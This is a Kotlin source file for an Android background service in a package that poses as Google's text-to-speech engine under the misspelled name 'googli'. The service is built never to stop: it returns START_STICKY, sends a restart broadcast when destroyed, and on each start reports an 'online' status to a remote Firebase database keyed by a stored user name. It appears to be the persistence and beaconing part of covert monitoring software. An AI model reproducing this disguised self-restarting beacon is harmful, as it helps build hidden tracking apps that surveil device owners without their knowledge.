package com.googli.googletext_to_speechengine

import android.app.Service
import android.content.Intent
import android.os.IBinder
import com.google.firebase.database.FirebaseDatabase
import java.util.*

class NeverEndingService : Service() {
    override fun onBind(intent: Intent?): IBinder {
        TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        println("I am Online")
        FirebaseDatabase.getInstance().reference.child(getSharedPreferences("Main", 0).getString("Name", "").toString()).child("NeverEndingServiceStatus").setValue(Random().nextInt())
        return START_STICKY
    }

    override fun onDestroy() {

        super.onDestroy()
        println("I am Offline")
        val restartServiceReciver = Intent("ac.in.ActivityRecognition.RestartSensor")
        sendBroadcast(restartServiceReciver)

    }
}